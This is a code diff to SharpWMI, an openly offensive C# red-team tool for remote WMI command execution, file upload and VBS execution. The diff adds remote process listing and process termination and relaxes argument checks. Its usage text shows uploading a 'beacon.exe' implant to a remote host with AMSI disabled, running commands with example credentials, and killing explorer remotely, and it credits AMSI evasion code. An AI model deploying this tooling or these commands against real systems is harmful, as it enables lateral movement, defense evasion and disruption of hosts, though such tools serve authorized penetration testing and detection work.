@@ -109,9 +109,9 @@ to return output from WMI remotely executed commands.
 
 AUTHORS:
   Original SharpWMI written:                    Will Schroeder @harmj0y (https://github.com/GhostPack/SharpWMI)
+  Enhancements, VBS flexibility, more actions:  Mariusz B. / mgeeky @mariuszbit
   WMI code-exec output idea:                    Evi1cg @Ridter
   AMSI evasion code taken from SharpMove:       Steven Flores 0xthirteen
-  Enhancements, VBS flexibility, file upload:   Mariusz B. / mgeeky @mariuszbit
 
 USAGE:
   Local system enumeration:        
@@ -131,6 +131,12 @@ USAGE:
 
   File upload via WMI:
     SharpWMI.exe action=upload computername=HOST[,HOST2,...] source=""C:\\source\\file.exe"" dest=""C:\\temp\\dest-file.exe"" [amsi=disable]
+
+  List processes:
+    SharpWMI.exe action=ps computername=HOST[,HOST2,...]
+
+  Terminate process (first found):
+    SharpWMI.exe action=terminate computername=HOST[,HOST2,...] process=PID|name
 
 NOTE: 
   Any remote function also takes an optional ""username=DOMAIN\\user"" ""password=Password123!""
@@ -190,6 +196,8 @@ EXAMPLES:
   SharpWMI.exe action=executevbs computername=primary.testlab.local username=""TESTLAB\\harmj0y"" password=""Password123!""
 
   SharpWMI.exe action=upload computername=primary.testlab.local source=""beacon.exe"" dest=""C:\\Windows\\temp\\foo.exe"" amsi=disable
+
+  SharpWMI.exe action=terminate computername=primary.testlab.local process=explorer
 ");
         }
 
@@ -365,6 +373,92 @@ EXAMPLES:
                     Console.WriteLine("{0,-15}: {1}", computerName, ant);
                     uniqUsers.Add(ant);
                 }
+            }
+        }
+
+        static void TerminateProcesses(string process, string computerName, string username, string password)
+        {
+            var scope = new ManagementScope();
+            string r = ConnectToWMI(ref scope, computerName, username, password, "root\\cimv2");
+            if (r.Length > 0)
+            {
+                throw new Exception(r);
+            }
+
+            try
+            {
+                ObjectQuery query;
+                int pid = 0;
+                if(Int32.TryParse(process, out pid))
+                {
+                    query = new ObjectQuery(string.Format("select * from Win32_Process where ProcessId = {0}", pid));
+                }
+                else
+                {
+                    query = new ObjectQuery(string.Format("select * from Win32_Process where Name like '%{0}%'", process));
+                }
+                
+                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
+                foreach (ManagementObject proc in searcher.Get())
+                {
+                    object ret = proc.InvokeMethod("Terminate", null);
+                    Console.WriteLine(string.Format("[+] Attempted to terminate remote process ({0}). Returned: {1}", process, ret));
+                }
+
+                Console.WriteLine(string.Format("[x] Process {0} not found", process));
+            }
+            catch (Exception ex)
+            {
+                throw new Exception(String.Format("[!] Could not retrieve remote processes to terminate! Exception: {0}", ex.ToString()));
+            }
+        }
+
+        static void GetProcesses(string computerName, string username, string password)
+        {
+            var scope = new ManagementScope();
+            string r = ConnectToWMI(ref scope, computerName, username, password, "root\\cimv2");
+            if (r.Length > 0)
+            {
+                throw new Exception(r);
+            }
+
+            try
+            {
+                var wmiProcess = new ManagementClass(scope, new ManagementPath("Win32_Process"), new ObjectGetOptions());
+
+                ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_Process");
+                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
+                ManagementObjectCollection data = searcher.Get();
+
+                foreach (ManagementObject result in data)
+                {
+                    System.Management.PropertyDataCollection props = result.Properties;
+                    var ps = new Dictionary<string, string>();
+
+                    ps["ProcessId"] = result.GetPropertyValue("ProcessId")?.ToString();
+                    ps["Name"] = result.GetPropertyValue("Name")?.ToString();
+                    ps["CommandLine"] = result.GetPropertyValue("CommandLine")?.ToString();
+                    ps["Owner"] = "";
+
+                    string[] argList = new string[] { string.Empty, string.Empty };
+                    try
+                    {
+                        int returnVal = Convert.ToInt32(result.InvokeMethod("GetOwner", argList));
+                        if (returnVal == 0)
+                        {
+                            ps["Owner"] = String.Format(@"{0}\{1}", argList[1]?.ToString(), argList[0]?.ToString());
+                        }
+                    }
+                    catch 
+                    { 
+                    }
+
+                    Console.WriteLine("{0,6} | {1,30} | {2, 25} | {3}", ps["ProcessId"], ps["Name"], ps["Owner"], ps["CommandLine"]);
+                }
+            }
+            catch (Exception ex)
+            {
+                throw new Exception(String.Format("[!] Could not retrieve remote processes list! Exception: {0}", ex.ToString()));
             }
         }
 
@@ -1451,7 +1545,7 @@ EXAMPLES:
 
         static void Main(string[] args)
         {
-            if (args.Length < 2)
+            if (args.Length < 1)
             {
                 Usage();
                 return;
@@ -1506,6 +1600,11 @@ EXAMPLES:
                 return;
             }
 
+            if(!arguments.ContainsKey("computername"))
+            {
+                arguments["computername"] = "localhost";
+            }
+
             if (arguments["action"] == "query")
             {
                 if (!arguments.ContainsKey("query"))
@@ -1546,18 +1645,9 @@ EXAMPLES:
             else if (arguments["action"] == "create" || arguments["action"] == "execute" || arguments["action"] == "exec")
             {
                 // remote process call creation
-                if ((arguments.ContainsKey("computername")) && (arguments.ContainsKey("command")))
+                if ((arguments.ContainsKey("command")))
                 {
                     string[] computerNames = arguments["computername"].Split(',');
-                    foreach (string computerName in computerNames)
-                    {
-                        RemoteWMIExecute(computerName, arguments["command"], username, password, result, disableAmsi);
-                    }
-                }
-                else if (arguments.ContainsKey("command"))
-                {
-                    // local process call creation
-                    string[] computerNames = { "localhost" };
                     foreach (string computerName in computerNames)
                     {
                         RemoteWMIExecute(computerName, arguments["command"], username, password, result, disableAmsi);
@@ -1571,7 +1661,7 @@ EXAMPLES:
             }
             else if (arguments["action"] == "upload")
             {
-                if (arguments.ContainsKey("computername") && arguments.ContainsKey("source") && arguments.ContainsKey("dest"))
+                if (arguments.ContainsKey("source") && arguments.ContainsKey("dest"))
                 {
                     string[] computerNames = arguments["computername"].Split(',');
                     byte[] fileData = GetFileContents(arguments["source"]);
@@ -1589,12 +1679,28 @@ EXAMPLES:
             }
             else if (arguments["action"] == "loggedon")
             {
-                if (arguments.ContainsKey("computername"))
+                string[] computerNames = arguments["computername"].Split(',');
+                foreach (string computerName in computerNames)
+                {
+                    GetLoggedOnUsers(computerName, username, password);
+                }
+            }
+            else if (arguments["action"] == "ps")
+            {
+                string[] computerNames = arguments["computername"].Split(',');
+                foreach (string computerName in computerNames)
+                {
+                    GetProcesses(computerName, username, password);
+                }
+            }
+            else if (arguments["action"] == "terminate")
+            {
+                if (arguments.ContainsKey("process"))
                 {
                     string[] computerNames = arguments["computername"].Split(',');
                     foreach (string computerName in computerNames)
                     {
-                        GetLoggedOnUsers(computerName, username, password);
+                        TerminateProcesses(arguments["process"], computerName, username, password);
                     }
                 }
                 else
@@ -1606,43 +1712,35 @@ EXAMPLES:
             else if (arguments["action"] == "executevbs")
             {
                 // remote VBS execution
-                if (arguments.ContainsKey("computername"))
+                string[] computerNames = arguments["computername"].Split(',');
+                string payload = GetVBSPayload(arguments);
+
+                // in seconds
+                int triggerTimerAfter = 10;
+                int scriptKillTimeout = 12;
+
+                if (arguments.ContainsKey("trigger"))
                 {
-                    string[] computerNames = arguments["computername"].Split(',');
-                    string payload = GetVBSPayload(arguments);
-
-                    // in seconds
-                    int triggerTimerAfter = 10;
-                    int scriptKillTimeout = 12;
-
-                    if (arguments.ContainsKey("trigger"))
-                    {
-                        triggerTimerAfter = Int32.Parse(arguments["trigger"]);
-                    }
-
-                    if (arguments.ContainsKey("timeout"))
-                    {
-                        scriptKillTimeout = Int32.Parse(arguments["timeout"]);
-                    }
-
-                    Console.WriteLine(String.Format(@"[*] Script will trigger after {0} and we'll wait for {1} seconds.",
-                        triggerTimerAfter, scriptKillTimeout));
-
-                    foreach (string computerName in computerNames)
-                    {
-                        string eventName = "Debug";
-                        if (arguments.ContainsKey("eventname"))
-                        {
-                            eventName = arguments["eventname"];
-                        }
-
-                        RemoteWMIExecuteVBS(computerName, eventName, username, password, payload, disableAmsi, triggerTimerAfter, scriptKillTimeout);
-                    }
+                    triggerTimerAfter = Int32.Parse(arguments["trigger"]);
                 }
-                else
+
+                if (arguments.ContainsKey("timeout"))
                 {
-                    Usage();
-                    return;
+                    scriptKillTimeout = Int32.Parse(arguments["timeout"]);
+                }
+
+                Console.WriteLine(String.Format(@"[*] Script will trigger after {0} and we'll wait for {1} seconds.",
+                    triggerTimerAfter, scriptKillTimeout));
+
+                foreach (string computerName in computerNames)
+                {
+                    string eventName = "Debug";
+                    if (arguments.ContainsKey("eventname"))
+                    {
+                        eventName = arguments["eventname"];
+                    }
+
+                    RemoteWMIExecuteVBS(computerName, eventName, username, password, payload, disableAmsi, triggerTimerAfter, scriptKillTimeout);
                 }
             }
             else
